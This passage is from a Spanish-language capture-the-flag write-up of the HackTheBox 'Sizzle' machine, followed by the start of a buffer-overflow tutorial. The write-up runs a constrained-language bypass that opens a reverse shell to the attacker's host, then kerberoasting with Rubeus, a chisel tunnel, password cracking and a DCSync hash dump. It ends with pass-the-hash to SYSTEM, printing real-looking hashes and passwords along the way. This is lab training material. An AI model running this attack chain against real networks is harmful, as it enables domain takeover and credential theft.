<ul>
  <li>Vamos a transferir el <code class="language-plaintext highlighter-rouge">.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; curl <span class="nt">-o</span> PsBypassCLM.exe http://10.10.14.71/PsBypassCLM.exe
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         5/7/2024  10:09 AM          33792 PsBypassCLM.exe
<span class="nt">-a----</span>         5/7/2024  10:04 AM        1680565 SharpHound.ps1


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>En el repositorio nos dicen que para ver si estamos en un <code class="language-plaintext highlighter-rouge">ConstrainedLanguage</code> podemos usar el siguiente comando la idea es que nos diga <code class="language-plaintext highlighter-rouge">Full</code> una vez nos enviemos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; <span class="nv">$ExecutionContext</span>.SessionState.LanguageMode
ConstrainedLanguage
</code></pre></div></div>

<ul>
  <li>Vamos enviarnos la reverse shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework64<span class="se">\v</span>4.0.30319<span class="se">\I</span>nstallUtil.exe /logfile<span class="o">=</span> /LogToConsole<span class="o">=</span><span class="nb">true</span> /revshell<span class="o">=</span><span class="nb">true</span> /rhost<span class="o">=</span>10.10.14.71 /rport<span class="o">=</span>443 /U C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments<span class="se">\P</span>sBypassC
Microsoft <span class="o">(</span>R<span class="o">)</span> .NET Framework Installation utility Version 4.6.1586.0
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation.  All rights reserved.



The uninstall is beginning.
See the contents of the log file <span class="k">for </span>the C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments<span class="se">\P</span>sBypassCLM.exe assembly<span class="s1">'s progress.
The file is located at .
Uninstalling assembly '</span>C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments<span class="se">\P</span>sBypassCLM.exe<span class="s1">'.
Affected parameters are:
   assemblypath = C:\Users\amanda\Documents\PsBypassCLM.exe
   rport = 443
   revshell = true
   rhost = 10.10.14.71
   logtoconsole = true
   logfile =
Trying to connect back...
</span></code></pre></div></div>

<ul>
  <li>Y ahora ya nos dice Full.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.103] 50710

PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\a</span>manda
PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; <span class="nv">$ExecutionContext</span>.SessionState.LanguageMode
FullLanguage
PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Y ahora ya solo ejecutas esto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\S</span>harpHound.ps1
PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; Invoke-BloodHound <span class="nt">-CollectionMethod</span> All
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a obtener el hash del usuario <code class="language-plaintext highlighter-rouge">kerberoastable</code> con <code class="language-plaintext highlighter-rouge">Rubeus</code> <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a>.</p>
  </li>
  <li>
    <p>Recuerda tener tu servidor http con python3 para transferirte los binarios.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; iwr <span class="nt">-uri</span> http://10.10.14.71:8080/Rubeus.exe <span class="nt">-OutFile</span> Rubeus.exe
</code></pre></div></div>

<ul>
  <li>Vamos a hacer el <code class="language-plaintext highlighter-rouge">kerberoasting</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; .<span class="se">\R</span>ubeus.exe kerberoast /creduser:htb.local<span class="se">\a</span>manda /credpassword:Ashare1972

   ______        _
  <span class="o">(</span>_____ <span class="se">\ </span>     | |
   _____<span class="o">)</span> <span class="o">)</span>_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ <span class="se">\|</span> ___ | | | |/___<span class="o">)</span>
  | |  <span class="se">\ \|</span> |_| | |_<span class="o">)</span> <span class="o">)</span> ____| |_| |___ |
  |_|   |_|____/|____/|_____<span class="o">)</span>____/<span class="o">(</span>___/

  v2.2.0


<span class="o">[</span><span class="k">*</span><span class="o">]</span> Action: Kerberoasting

<span class="o">[</span><span class="k">*</span><span class="o">]</span> NOTICE: AES hashes will be returned <span class="k">for </span>AES-enabled accounts.
<span class="o">[</span><span class="k">*</span><span class="o">]</span>         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="k">for </span>these accounts.

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target Domain          : HTB.LOCAL
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching path <span class="s1">'LDAP://sizzle.HTB.LOCAL/DC=HTB,DC=LOCAL'</span> <span class="k">for</span> <span class="s1">'(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Total kerberoastable <span class="nb">users</span> : 1


<span class="o">[</span><span class="k">*</span><span class="o">]</span> SamAccountName         : mrlky
<span class="o">[</span><span class="k">*</span><span class="o">]</span> DistinguishedName      : <span class="nv">CN</span><span class="o">=</span>mrlky,CN<span class="o">=</span>Users,DC<span class="o">=</span>HTB,DC<span class="o">=</span>LOCAL
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ServicePrincipalName   : http/sizzle
<span class="o">[</span><span class="k">*</span><span class="o">]</span> PwdLastSet             : 7/10/2018 2:08:09 PM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Supported ETypes       : RC4_HMAC_DEFAULT
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Hash                   : <span class="nv">$krb5tgs$23$*</span>mrlky<span class="nv">$HTB</span>.LOCAL<span class="nv">$http</span>/sizzle@HTB.LOCAL<span class="k">*</span><span class="nv">$A57A767CBB9A6FD9AB5842CC991A</span>
                             46B5<span class="nv">$30E6FC74B860D3B600896EA65C12C4723F1461BF592F0F5FCFA23AC7D162B703E8AE9041A3A</span>
                             31ACD7DCA9F03E702F63FB7FC4E1374C4BD10471FC403CF32F5C92F3EFE40A52D0237EE94C29ACAE
                             9D82ACF068E5BB7BE6006EC22505009F361FAFAB99FD9B5EE640B7F7AD729118738B1BD95E1FBE7F
                             B52445D0E13901A4B133335294E60F70845421A34907C7DA0DE8E658D7AEE8A39B600289A0586B65
                             E595C68ED7EBA4E61BDFCA067D67E2F7D0609E90B000118D050CD060FB7B7680266B424743759EC2
                             D5B9778D452A5D8544E63F1D452FFB4EC4BE32472DF0B4F8422D8C73D7BC602550F0770260563184
                             30B3FA13AACB3866D0820F602236162F668E24FA53F63FF03CE024847B6162529620274B7551386D
                             967C05722EAC2302BA9341AD833DDAC29AA598A9275CFB5B499AC5087D1E5767BEA5F2171825826F
                             2323DF66E632008279D97330988280DD8A961D7067EF8F272640E6E94BE64BDB6A97C2BFAC5BF6FC
                             221D988D5543E8E76D12BBE93E958665FF436C890F365DC15E4A67F363D1C38A16FCED254760E83C
                             3F666E153220A9A31C79B01766247898D0EEC4DDC804AB7A6E48B2B9A712B5AE1B30F9A41548837C
                             C6F617057BDC299CF0D330B7596D3442AA11D6C59734FAA30BD93298D3B6066CE5D9762B0B43B6F5
                             24D4576B6011E8BDDFEC99715FD2463297E094EE06AF9F13344EC6B1133E93EA10EAC18BBB287247
                             10B339B73F43CEC47230ED606CB00FF7781DFA0C0FADA66D2869A1FF0D64D4B07F87E1A19C3C9150
                             DCF1D3C258136BBD9F23873A1709B28C07C55E4C35914EACF0B33D727E57E8B6FE182F77D44BBC6B
                             E56F7295D5EFAC4EC98FF97CB9C71A35B1EEB4F22096BA7AC0D3A83E0A588E8EBB422555AD3C65C2
                             26B7F77C3BBD5C4FE8E35B6A952289A72FCF311E8253FD3D1D6C14B23313610E117088BE234CA81C
                             E749BC83EEFA118A6FB81205879854E8A8D6460C507F28A23E4872289F21C574B56555428E09B861
                             4F6780FC46B33185EE7A00051FEF54738C9D52FCAC78CFB04BE03EB586FD35143C0DCF20CD6511A9
                             267F42BDFFD5891187A9D2194ACE9DD4C705AB43045B122C1A6193E0E2E256E1565BBF65914A116F
                             668AC7F9A10D911E30EE4D9445A85B8E174A7FF4D506428F4E2728056E8999D8E1DC0161EF1CBCCD
                             3CF9FAF77735852D9FD235F4925C0F5BFB042DD5C0F75C7DEFD441A3FEA1FA7710CFED3D5F3D5E09
                             E2303F6B9280367257558FFBD4C1175BDFDFA3C524E94A0AE66D990E87F4C078E31A7DC26CD8AA3C
                             3301E88D7A6413510E57118F1FF45A02309D2D06F8CDFE46A1E46DB8E02D514D1BA156759C96F17A
                             CF0DF039CC8DE358E

PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>La otra forma es hacer un túnel para traernos el puerto 88 de <code class="language-plaintext highlighter-rouge">kerberos</code> hacer un <code class="language-plaintext highlighter-rouge">port Forwarding</code> <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>.</p>
  </li>
  <li>
    <p>Vamos a compilarlo y a reducir su tamaño.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  chisel git:<span class="o">(</span>master<span class="o">)</span> go build <span class="nt">-ldflags</span> <span class="s2">"-s -w"</span> <span class="nb">.</span>
go: downloading github.com/gorilla/websocket v1.5.0
go: downloading github.com/jpillora/backoff v1.0.0
go: downloading golang.org/x/crypto v0.16.0
go: downloading golang.org/x/net v0.14.0
go: downloading golang.org/x/sync v0.5.0
go: downloading github.com/jpillora/requestlog v1.0.0
go: downloading github.com/jpillora/sizestr v1.0.0
go: downloading github.com/fsnotify/fsnotify v1.6.0
go: downloading github.com/armon/go-socks5 v0.0.0-20160902184237-e75332964ef5
go: downloading github.com/andrew-d/go-termutil v0.0.0-20150726205930-009166a695a2
go: downloading github.com/jpillora/ansi v1.0.3
go: downloading github.com/tomasen/realip v0.0.0-20180522021738-f0c99a92ddce
go: downloading golang.org/x/sys v0.15.0
go: downloading golang.org/x/text v0.14.0
➜  chisel git:<span class="o">(</span>master<span class="o">)</span> upx chisel
                       Ultimate Packer <span class="k">for </span>eXecutables
                          Copyright <span class="o">(</span>C<span class="o">)</span> 1996 - 2024
UPX 4.2.2       Markus Oberhumer, Laszlo Molnar &amp; John Reiser    Jan 3rd 2024

        File size         Ratio      Format      Name
   <span class="nt">--------------------</span>   <span class="nt">------</span>   <span class="nt">-----------</span>   <span class="nt">-----------</span>
   8999172 -&gt;   3591920   39.91%   linux/amd64   chisel

Packed 1 file.
</code></pre></div></div>

<ul>
  <li>Ahora para el de Windows nos descargamos el que esta aquí <a href="https://github.com/jpillora/chisel/releases">https://github.com/jpillora/chisel/releases</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  chisel git:<span class="o">(</span>master<span class="o">)</span> ✗ file chisel_1.9.1_windows_amd64
chisel_1.9.1_windows_amd64: PE32+ executable <span class="o">(</span>console<span class="o">)</span> x86-64, <span class="k">for </span>MS Windows, 8 sections
➜  chisel git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">mv </span>chisel_1.9.1_windows_amd64 chisel.exe
➜  chisel git:<span class="o">(</span>master<span class="o">)</span> python3 <span class="nt">-m</span> http.server 8080
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; iwr <span class="nt">-uri</span> http://10.10.14.71:80/chisel.exe <span class="nt">-OutFile</span> chisel.exe
PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>Ahora nosotros seremos el servidor.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  chisel git:<span class="o">(</span>master<span class="o">)</span> ./chisel server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
2024/05/07 09:03:18 server: Reverse tunnelling enabled
2024/05/07 09:03:18 server: Fingerprint 16dJOQQHSw8JF9qeIlyrDq6K4oNb3xYlOH9kNye/Ors<span class="o">=</span>
2024/05/07 09:03:18 server: Listening on http://0.0.0.0:1234
</code></pre></div></div>

<ul>
  <li>Ahora nos conectamos</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; .<span class="se">\c</span>hisel.exe client 10.10.14.71:1234 R:88:127.0.0.1:88 R:389:127.0.0.1:389
</code></pre></div></div>

<ul>
  <li>Y ya podemos obtener el hash de esta forma.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  chisel git:<span class="o">(</span>master<span class="o">)</span> impacket-GetUserSPNs htb.local/amanda:Ashare1972 <span class="nt">-request</span> <span class="nt">-dc-ip</span> 127.0.0.1
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name   MemberOf                                               PasswordLastSet             LastLogon                   Delegation
<span class="nt">--------------------</span>  <span class="nt">-----</span>  <span class="nt">-----------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
http/sizzle           mrlky  <span class="nv">CN</span><span class="o">=</span>Remote Management Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>HTB,DC<span class="o">=</span>LOCAL  2018-07-10 13:08:09.536421  2018-07-12 09:23:50.871575      



<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="nv">$krb5tgs$23$*</span>mrlky<span class="nv">$HTB</span>.LOCAL<span class="nv">$htb</span>.local/mrlky<span class="k">*</span><span class="nv">$f3ca9959c7886d16612228c798ff9096$69b1e07dccf94e836a5c99dd0779485a9ef5d98f8b468736c345a2477bac34f11098aa89aa900300f4577f830743709f8820db8488a1b0a45f41d479444cc2d941b70a8d09b7ab6ec04acb46c083754a5981c9baed7225411f084be6cc07410c8efcf01b2485319f6fe471502efd0d5a72021433c7c86dc73bf941882f0b847a5cec47adf4b5b3e18320bf7fbf79b919a7355d9f624339a8f236314be83e84f5b42b2eea4a9ca3b3f28cbb09fb946edaba77e304ec4ef49d787a8a242b746213930b13ccce74e8133b4b3c4bf77ba650be143c882ef41f4cc15848505f1311e7c1f8464677bb8e55fbe300245d1450edc5f828a374def3152ca0d1bcb1bf73cc6b3b9a0f36b1bc96d3240288af5ee807b8f8f0184eac0d7ea2d5232b70d3ff4636f62bad5fbc04392d2d77e885cad8707ce98f77c5b5c6bb92926d75d220d93a6b6ccb55a8acd4666c16eacbabbc866e007d67e3a9da248ae0dd17a737802fce1d428ec261462f63b515572cf0629d8b8d48e08ff0bbfbb79af8cddc9b3449904ceeb54707fc84a6a1948a8749cba0be396ded735bf950e842ff385995928f72f79518c7f6fbdd75c816d39325a7cb34247da7cb64ca954e3aa3365ee766008690dfde68cae566c4c00f4a461ec994ebe1b074cddd23431f9c2424394deab4aa469df2d6357b38d5c10a3021871d4b7580bb2df1b0e1e154bcf01190b48478735fa3732ecfa49eb7ca038fa589b8620dd9c966c210c809f9e11b5b40adabfe0011fa63ca0246f9fdf89ec581c55c5118bf5202516ece9da1fe2a58340335269ed904dd2f1da10ef88f8f0a0b2c375ce8c0ed55a7f110e49c85359a8eb09807dbe2edc3d96d82486ec95993c0ec2b41a8cd2df9a24eae7499d6f11613cc7d484b2bacea6558453a7fd8fd68572f0cd9713061ee3523f8df77ead9134915150a510d4b5c7c37ebb614ec8950228a06dc4eaa0330afcccd52e20466334661f74dc97942de4cb9eea41e03f6ca385c21ed024ac6bb953ddff3350df93d5d80b8264f5471297ec585d4ade095a4d233a41e5115dedfdd03fc6a13434b3ec02ee35fb2a71c37cbb25c4b86d68ace0c57c6fe35ed2699e5eecc0ca631178ce945068d7a6a07499502f2a762eb6d950a4fba46bce7454871b38562d9c7ec95e0f86c1e8befc0ae3ae2011bc1fcfe22c980965bcaf93cc09b14f211b80e5e429b222055f579f8a52258eff5fc7f0d77feb5ecaaca897513922b020eda</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya crackeamos el hash para ver la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hash2
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Football#7       <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:17 DONE <span class="o">(</span>2024-05-07 09:06<span class="o">)</span> 0.05691g/s 635585p/s 635585c/s 635585C/s Forever3!..FokinovaS1
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>En esta ruta del sistema encontré un <code class="language-plaintext highlighter-rouge">.txt</code> donde había hashes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32&gt; <span class="nb">type </span>file.txt
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::

Domain    User  ID  Hash
<span class="nt">------</span>    <span class="nt">----</span>  <span class="nt">--</span>  <span class="nt">----</span>
HTB.LOCAL Guest 501 -
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::


PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32&gt;
</code></pre></div></div>

<ul>
  <li>Como el usuario mrlky tiene privilegios <code class="language-plaintext highlighter-rouge">DCSync</code> y aparte tenemos su hash podemos usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> para ver el hash del administrador y conectarnos con <code class="language-plaintext highlighter-rouge">psexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.10.103 <span class="nt">-u</span> mrlky <span class="nt">-H</span> bceef4f6fe9c026d1d8dec8dce48adef <span class="nt">--ntds</span> drsuapi
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] HTB.LOCAL<span class="se">\m</span>rlky:bceef4f6fe9c026d1d8dec8dce48adef
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
SMB         10.10.10.103    445    SIZZLE           Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
SMB         10.10.10.103    445    SIZZLE           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.103    445    SIZZLE           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
SMB         10.10.10.103    445    SIZZLE           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.103    445    SIZZLE           amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
SMB         10.10.10.103    445    SIZZLE           mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
SMB         10.10.10.103    445    SIZZLE           sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SMB         10.10.10.103    445    SIZZLE           SIZZLE<span class="nv">$:</span>1001:aad3b435b51404eeaad3b435b51404ee:91537ada1c7e820e40c8f13bcbb4e42a:::
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] Dumped 8 NTDS hashes to /home/miguel/.cme/logs/SIZZLE_10.10.10.103_2024-05-07_091141.ntds of which 7 were added to the database
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-psexec htb.local/Administrator@sizzle.htb.local <span class="nt">-hashes</span> :f6b7160bfc91823792e0ac3a162c9267
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on sizzle.htb.local.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file PVZdBnKc.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on sizzle.htb.local.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service daJw on sizzle.htb.local.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service daJw.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.14393]
<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<ul>
  <li>Vamos hacerlo sin el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.10.103 <span class="nt">-u</span> mrlky <span class="nt">-p</span> Football#7 <span class="nt">--ntds</span> drsuapi
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] HTB.LOCAL<span class="se">\m</span>rlky:Football#7
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
SMB         10.10.10.103    445    SIZZLE           Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
SMB         10.10.10.103    445    SIZZLE           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.103    445    SIZZLE           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
SMB         10.10.10.103    445    SIZZLE           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.103    445    SIZZLE           amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
SMB         10.10.10.103    445    SIZZLE           mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
SMB         10.10.10.103    445    SIZZLE           sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SMB         10.10.10.103    445    SIZZLE           SIZZLE<span class="nv">$:</span>1001:aad3b435b51404eeaad3b435b51404ee:91537ada1c7e820e40c8f13bcbb4e42a:::
</code></pre></div></div>

<h2 id="root-flag-and-user-flag">Root flag and user flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
2551eafa119b3d4d6c7e1e28db9dec74
C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>rlky<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
e1c1537f865b3f1aad46459eb491e08a
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Buffer Overflow For Beginners and Ret2libc</title><link href="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html" rel="alternate" type="text/html" title="Buffer Overflow For Beginners and Ret2libc" /><published>2024-05-03T00:00:00-06:00</published><updated>2024-05-03T00:00:00-06:00</updated><id>http://localhost:4000/vulnhub/machines/2024/05/03/buffer</id><content type="html" xml:base="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html"><![CDATA[<p align="center">
<img src="/assets/vulnhub/buff/icon.png" />
</p>

<h2 id="level-one">Level One</h2>

<blockquote>
  <p>Comparación de caracteres.</p>
</blockquote>

<blockquote>
  <p>Vamos a desactivar el ASRL temporalmente.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">echo </span>0 | <span class="nb">sudo tee</span> /proc/sys/kernel/randomize_va_space
0
</code></pre></div></div>

<ul>
  <li>
    <p>Lo primero que vamos hacer es analizar el código que esta escrito en C.</p>
  </li>
  <li>
    <p>Vemos que se esta definiendo un Buffer de tamaño 32 bytes, esta asignado una variable <code class="language-plaintext highlighter-rouge">long key</code> con valor <code class="language-plaintext highlighter-rouge">0x12345678</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/1.png" />
</p>

<ul>
  <li>Esta es la parte interesante ya que vemos que si se igual el valor <code class="language-plaintext highlighter-rouge">key</code> a <code class="language-plaintext highlighter-rouge">0x42424242</code> se va ejecutar una <code class="language-plaintext highlighter-rouge">/bin/sh</code> que es el objetivo en caso de que no sea ese valor no se hará nada.</li>
</ul>

<pre><code class="language-C">if(key == 0x42424242) {
        execve("/bin/sh", 0, 0);
    }
    else {
        printf("%s\n", "Sorry try again...");
    }
</code></pre>

<ul>
  <li>Para saber a cuanto equivale el valor <code class="language-plaintext highlighter-rouge">key</code> podemos hacerlo desde <code class="language-plaintext highlighter-rouge">bash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">42"</span>
B%
</code></pre></div></div>

<ul>
  <li>
